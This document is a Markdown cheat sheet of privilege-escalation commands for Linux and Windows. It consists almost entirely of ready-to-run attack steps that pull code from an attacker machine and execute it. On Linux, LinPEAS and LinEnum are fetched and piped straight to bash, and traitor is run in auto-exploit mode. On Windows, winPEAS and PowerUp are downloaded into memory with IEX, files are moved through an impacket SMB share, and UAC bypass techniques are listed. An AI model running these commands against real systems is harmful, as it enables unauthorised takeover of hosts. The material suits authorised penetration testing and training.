# Privilege Escalation

## Linux

- HTTP

Host the file

```bash
cd /opt/linux_privesc
sudo python -m http.server 80
```

### LinPEAS

```bash
curl http://<Kali IP>/linpeas.sh | bash
```

or

```bash
wget http://<Kali IP>/linpeas.sh
bash linpeas.sh
```

### LinEnum.sh

```bash
curl http://<Kali IP>/LinEnum.sh | bash
```

or

```bash
wget http://<Kali IP>/LinEnum.sh
bash LinEnum.sh
```

### linuxprivchecker.py

```bash
wget http://<Kali IP>/linuxprivchecker.py
python linuxprivchecker.py
```

### Trator

```bash
wget http://<Kali IP>/traitor-amd64
chmod +x traitor-amd64
./traitor-amd64 -a
```

### pspy

```bash
wget http://<Kali IP>/pspy64s
chmod +x pspy64s
./pspy64s
```

## Windows

### winPEAS

- HTTP

Host the file

```bash
cd /usr/share/windows-resources/binaries
sudo python -m http.server 80
```

Copy on Target and execute

```powershell
Invoke-WebRequest -Uri 'http://<Kali IP>/winPEASany.exe' -OutFile <Path>\winPEASany.exe
<Path>\winPEASany.exe
```

Or execute direct on memory

```powershell
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/winPEASany.exe')
```

- SMB

Host the file

```bash
cd /usr/share/windows-resources/binaries
impacket-smbserver share $(pwd) -smb2support
```

```bash
net use \\<Kali IP>\share
copy \\<Kali IP>\share\winPEASany.exe .
winPEASany.exe
```

or

```bash
xcopy \\<Kali IP>\share\winPEASany.exe C:\Temp\winPEAS\

cd C:\Temp\winPEAS
C:\Temp\winPEAS\winPEASany.exe > C:\Temp\winPEAS\winPEAS.log

xcopy C:\Temp\winPEAS\winPEAS.log \\<Kali IP>\share\
```

### PowerUp

- HTTP

Host the file

```bash
cd /usr/share/windows-resources/powersploit/Privesc/
sudo python -m http.server 80
```

Copy on Target and execute

```powershell
Invoke-WebRequest -Uri 'http://<Kali IP>/PowerUp.ps1' -OutFile <Path>\PowerUp.ps1
Import-Module <Path>\PowerUp.ps1
Invoke-AllChecks
```

Or execute direct on memory

```powershell
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/PowerUp.ps1')
Invoke-AllChecks
```

- SMB

Host the file

```bash
cd /usr/share/windows-resources/powersploit/Privesc/
impacket-smbserver share $(pwd) -smb2support
```

```powershell
net use \\<Kali IP>\share
copy \\<Kali IP>\share\PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

or

```powershell
xcopy \\<Kali IP>\share\PowerUp.ps1 C:\Temp\PowerUp\

Import-Module C:\Temp\PowerUp\PowerUp.ps1
Invoke-AllChecks
```

### Bypass-UAC

- HTTP

```powershell
Invoke-WebRequest -Uri 'http://<Kali IP>/Bypass-UAC.ps1' -OutFile <Path>\Bypass-UAC.ps1
Import-Module <Path>\Bypass-UAC.ps1
Get-Help Bypass-UAC
```

```powershell
#-------------------#
# Supported Methods #
#-------------------#

+ UacMethodSysprep: x32/x64 Win7-Win8
+ ucmDismMethod: x64 Win7+ (unpatched, tested up to 10RS2 14926)
+ UacMethodMMC2: x64 Win7+ (unpatched, tested up to 10RS2 14926)
+ UacMethodTcmsetup: x32/x64 Win7-10 (UAC "0day" A_\_(aƒ,)_/A_)
+ UacMethodNetOle32: x32/x64 Win7-10 (UAC "0day" A_\_(aƒ,)_/A_)
```

## Links

- [Basic Linux privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
- [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker)
- [Trator](https://github.com/liamg/traitor)
- [GTFOBins](https://gtfobins.github.io/)
- [pspy](https://github.com/DominicBreuker/pspy)
- [Windows - blog- uac-bypass](https://juggernaut-sec.com/uac-bypass/)
- [Windows - how uac-bypass work](https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz)
- [Windows - UACMe - uac-bypass](https://github.com/hfiref0x/UACME)
- [Windows - UAC - Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
